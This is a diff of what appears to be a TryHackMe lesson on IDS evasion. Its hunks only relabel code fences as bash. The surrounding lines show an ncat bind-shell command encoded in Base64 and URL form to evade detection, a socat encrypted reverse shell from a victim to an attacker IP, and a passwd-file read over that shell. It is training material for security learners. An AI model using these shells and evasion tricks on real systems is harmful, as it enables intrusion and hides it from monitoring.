@@ -144,7 +144,7 @@ Download Task FilesEach IDS/IPS has a certain syntax to write its rules. For exa
  If ASCII logging is chosen, the logs would be similar to the two alerts shown next.
 
     Snort Logs  
-```Snort Logs 
+```bash
 [**] [1:1000031:1] Netcat Exploitation [**]
 [Priority: 0] 
 01/14-12:51:26.717401 10.14.17.226:45480 -> 10.10.112.168:80
@@ -351,7 +351,7 @@ Evasion via payload manipulation includes:
  Encode to Base64 format You can use one of the many online tools that encode your input to Base64. Alternatively, you can use `base64` commonly found on Linux systems.
 
     Pentester Terminal  
-```Pentester Terminal 
+```bash
 pentester@TryHackMe$ cat input.txt
 ncat -lvnp 1234 -e /bin/bash
 $ base64 input.txt
@@ -365,7 +365,7 @@ bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==
  One utility that you can easily install on your Linux system is `urlencode`; alternatively, you can either use an online service or search for similar utilities on MS Windows and macOS. To follow along on the AttackBox, you can install `urlencode` by running the command `apt install gridsite-clients`.
 
     Pentester Terminal  
-```Pentester Terminal 
+```bash
 pentester@TryHackMe$ urlencode ncat -lvnp 1234 -e /bin/bash
 ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash
 ```
@@ -436,7 +436,7 @@ ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash
  Let’s demonstrate this. On the attacker system, we carried out the following:
 
     Pentester Terminal  
-```Pentester Terminal 
+```bash
 pentester@TryHackMe$ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
 Generating a RSA private key
 ........................++++
@@ -454,14 +454,14 @@ pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify
    As we have a listener on the attacker system, we switched to the victim machine, and we executed the following:
 
     Target Terminal  
-```Target Terminal 
+```bash
 pentester@target$ socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
 ```
 
    Back to the attacker system, let’s run `cat /etc/passwd`:
 
     Pentester Terminal  
-```Pentester Terminal 
+```bash
 pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
 [...]
 2022/02/24 15:54:28 socat[7620] N starting data transfer loop with FDs [7,7] and [1,1]
